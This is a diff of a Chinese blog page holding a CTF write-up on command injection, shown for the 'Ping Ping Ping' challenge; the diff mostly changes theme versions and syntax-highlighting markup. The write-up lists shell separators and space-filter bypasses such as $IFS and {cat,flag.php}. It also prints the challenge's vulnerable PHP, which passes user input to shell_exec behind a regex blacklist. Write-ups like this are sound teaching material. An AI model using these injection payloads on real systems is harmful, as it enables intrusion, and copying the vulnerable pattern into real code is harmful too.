@@ -1,11 +1,11 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>CTF-命令执行 | Extraderの博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Extrader"><meta name="copyright" content="Extrader"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>CTF-命令执行 | Extraderの博客</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
   [".post-card",".post-content img"].forEach((target)=> {
     ScrollReveal().reveal(target);
   })
 });
-</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/favico.ico"><link rel="mask-icon" href="/favico.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
+</script><link class="aplayer-style-marker" rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script class="aplayer-script-marker" src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" defer></script><script class="meting-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js" defer></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/favico.ico"><link rel="mask-icon" href="/favico.ico" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
     const Yun = window.Yun || {};
-    window.CONFIG = {"hostname":"www.extrader.top","root":"/","title":["Under","The","Sea"],"version":"1.5.3","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194","3, 28, 95","0, 8, 55"]}};
+    window.CONFIG = {"hostname":"www.extrader.top","root":"/","title":["Under","The","Sea"],"version":"1.6.1","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194","3, 28, 95","0, 8, 55"]}};
   </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="alternate" href="/atom.xml" title="Extraderの博客" type="application/atom+xml"><script>(function(){
   var bp = document.createElement('script');
   var curProtocol = window.location.protocol.split(':')[0];
@@ -45,17 +45,17 @@
 <meta property="article:tag" content="CTF题">
 <meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png"><script src="/js/ui/mode.js"></script><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Extrader"><img width="96" loading="lazy" src="/images/avatar.png" alt="Extrader"></a><div class="site-author-name"><a href="/about/">Extrader</a></div><a class="site-name" href="/about/site.html">Extraderの博客</a><sub class="site-subtitle"></sub><div class="site-desciption">不要给自己制造舒适区</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">47</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">31</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=710712799&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Extrader-home" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:nowczj@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/extraderhome" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=414334284" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/Extraderhome/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/397842685" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/Extrader_" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/extraderhome" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a><a class="links-item hty-icon-button" href="/albums/" title="相册" style="color:undefined"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-gallery-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019GXYCTF-Ping-Ping-Ping"><span class="toc-number">1.</span> <span class="toc-text">2019GXYCTF-Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-duangShell"><span class="toc-number">2.</span> <span class="toc-text">BJDCTF-2nd-duangShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">3.</span> <span class="toc-text">BUUCTF-2018-Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GKCTF2020-CheckIN"><span class="toc-number">4.</span> <span class="toc-text">GKCTF2020-CheckIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-EasySearch"><span class="toc-number">5.</span> <span class="toc-text">[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">6.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBCTF2019-RCEService"><span class="toc-number">7.</span> <span class="toc-text">[FBCTF2019]RCEService</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.extrader.top/posts/c714e372/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Extrader"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Extraderの博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF-命令执行</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2020-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2020-03-10T00:00:00+08:00">2020-03-10</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2020-08-17 15:48:02" itemprop="dateModified" datetime="2020-08-17T15:48:02+08:00">2020-08-17</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF%E9%A2%98/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF题</span></a><a class="tag-item" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">命令执行</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="2019GXYCTF-Ping-Ping-Ping"><a href="#2019GXYCTF-Ping-Ping-Ping" class="headerlink" title="2019GXYCTF-Ping Ping Ping"></a>2019GXYCTF-Ping Ping Ping</h3><p>12月份的GWYCTF，BUUCTF上复现</p>
+<meta name="twitter:image" content="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Extrader"><img width="96" loading="lazy" src="/images/avatar.png" alt="Extrader"></a><div class="site-author-name"><a href="/about/">Extrader</a></div><a class="site-name" href="/about/site.html">Extraderの博客</a><sub class="site-subtitle"></sub><div class="site-desciption">不要给自己制造舒适区</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">47</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">31</span></a></div><a class="site-state-item hty-icon-button" href="/links/" title="友链"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-open-arm-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=710712799&amp;site=qq&amp;menu=yes" title="QQ" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Extrader-home" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:nowczj@gmail.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/extraderhome" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=414334284" title="网易云音乐" target="_blank" style="color:#C10D0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/Extraderhome/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/397842685" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/Extrader_" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/extraderhome" title="Telegram" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-women-line"></use></svg></a><a class="links-item hty-icon-button" href="/albums/" title="相册" style="color:undefined"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-gallery-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#2019GXYCTF-Ping-Ping-Ping"><span class="toc-number">1.</span> <span class="toc-text">2019GXYCTF-Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-duangShell"><span class="toc-number">2.</span> <span class="toc-text">BJDCTF-2nd-duangShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BUUCTF-2018-Online-Tool"><span class="toc-number">3.</span> <span class="toc-text">BUUCTF-2018-Online Tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GKCTF2020-CheckIN"><span class="toc-number">4.</span> <span class="toc-text">GKCTF2020-CheckIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF2020-EasySearch"><span class="toc-number">5.</span> <span class="toc-text">[BJDCTF2020]EasySearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">6.</span> <span class="toc-text">[极客大挑战 2019]RCE ME</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FBCTF2019-RCEService"><span class="toc-number">7.</span> <span class="toc-text">[FBCTF2019]RCEService</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://www.extrader.top/posts/c714e372/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Extrader"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Extraderの博客"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF-命令执行</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2020-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2020-03-10T00:00:00+08:00">2020-03-10</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2020-08-17 15:48:02" itemprop="dateModified" datetime="2020-08-17T15:48:02+08:00">2020-08-17</time></div><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF%E9%A2%98/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF题</span></a><a class="tag-item" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">命令执行</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><h3 id="2019GXYCTF-Ping-Ping-Ping"><a href="#2019GXYCTF-Ping-Ping-Ping" class="headerlink" title="2019GXYCTF-Ping Ping Ping"></a>2019GXYCTF-Ping Ping Ping</h3><p>12月份的GWYCTF，BUUCTF上复现</p>
 <p>别人学校招新的题目，我还是不会，太菜了</p>
-<a id="more"></a>
+<span id="more"></span>
 
 <p>先来看看题目的界面</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt loading="lazy"></p>
 <p>由题意得，传参ip</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt loading="lazy"></p>
 <p>联想命令执行，命令执行的方法大致两种：</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">;：用于连续指令执行
-|：管道符，将左边的输出当做右边的输入，只返回右边的结果</code></pre>
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">;</span>：用于连续指令执行
+<span class="token operator">|</span>：管道符，将左边的输出当做右边的输入，只返回右边的结果</code></pre>
 
 <p>尝试分号：</p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt loading="lazy"></p>
@@ -65,12 +65,12 @@
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt loading="lazy"></p>
 <p>emmmmmmmmmmmmm空格被办了。。。</p>
 <p>从大佬那学习绕过空格的方法，大概有以下几种：</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">$IFS
-$&#123;IFS&#125;
-$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行
-&lt; 
-&lt;&gt; 
-&#123;cat,flag.php&#125;  &#x2F;&#x2F;用逗号实现了空格功能
+<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token environment constant">$IFS</span>
+<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>
+<span class="token environment constant">$IFS</span><span class="token variable">$1</span> //<span class="token variable">$1</span>改成$加其他数字貌似都行
+<span class="token operator">&lt;</span> 
+<span class="token operator">&lt;></span> 
+<span class="token punctuation">&#123;</span>cat,flag.php<span class="token punctuation">&#125;</span>  //用逗号实现了空格功能
 %20 
 %09 </code></pre>
 
@@ -78,36 +78,36 @@ $IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt loading="lazy"></p>
 <p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt loading="lazy"></p>
 <p>index.php代码如下：</p>
-<pre class="language-php" data-language="php"><code class="language-php">&#x2F;?ip&#x3D;
-&#x2F;?ip&#x3D;
-|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match))&#123;
-    echo preg_match(&quot;&#x2F;\&amp;|\&#x2F;|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#39;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;&#x2F;&quot;, $ip, $match);
-    die(&quot;fxck your symbol!&quot;);
-  &#125; else if(preg_match(&quot;&#x2F; &#x2F;&quot;, $ip))&#123;
-    die(&quot;fxck your space!&quot;);
-  &#125; else if(preg_match(&quot;&#x2F;bash&#x2F;&quot;, $ip))&#123;
-    die(&quot;fxck your bash!&quot;);
-  &#125; else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;
-    die(&quot;fxck your flag!&quot;);
-  &#125;
-  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);
-  echo &quot;
-&quot;;
-  print_r($a);
-&#125;
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
+<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
+<span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
